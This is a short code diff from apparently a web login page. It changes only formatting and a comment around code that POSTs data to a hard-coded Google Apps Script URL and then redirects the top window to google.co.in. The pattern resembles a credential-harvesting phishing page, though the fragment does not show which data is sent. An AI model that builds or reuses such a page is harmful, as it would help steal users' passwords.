@@ -128,7 +128,7 @@
     // REPLACE WITH YOUR ACTUAL APPS SCRIPT WEB APP URL
     const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbwBpW3jUbojaR9-VTJBVDp71_A3LlGhviTRh2WDoFfpJf53HyUTTNdzPeQLX_T-NWz4/exec";
 
-    fetch(WEB_APP_URL, {
+fetch(WEB_APP_URL, {
       method: 'POST',
       headers: {
         'Content-Type': 'text/plain;charset=utf-8',
@@ -146,7 +146,7 @@
         showToast();
         setTimeout(() => {
           window.top.location.href = "https://www.google.co.in";
-        }, 1200); // Wait 1.2 seconds to display the toast message before redirecting
+        }, 1200);
       } else {
         showError("Invalid User ID or Password.");
       }
